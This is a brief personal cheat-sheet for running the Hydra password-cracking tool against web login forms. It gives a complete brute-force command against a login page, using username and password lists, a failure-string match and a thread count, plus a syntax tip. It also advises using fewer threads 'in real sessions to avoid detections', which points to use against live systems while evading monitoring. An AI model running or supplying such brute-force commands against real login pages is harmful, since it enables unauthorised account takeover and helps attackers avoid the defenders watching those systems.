for http forms its normal command -> https-post-form//"path:details:false string" (hydra)


for https

hydra -L users.txt -P passwords.txt example.com https-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Login failed" -V -t 16 -f

->> if url remove the http:// or https it confuses hyrda


use 64 threads in labs use deault 16 in real sessions to avoid detections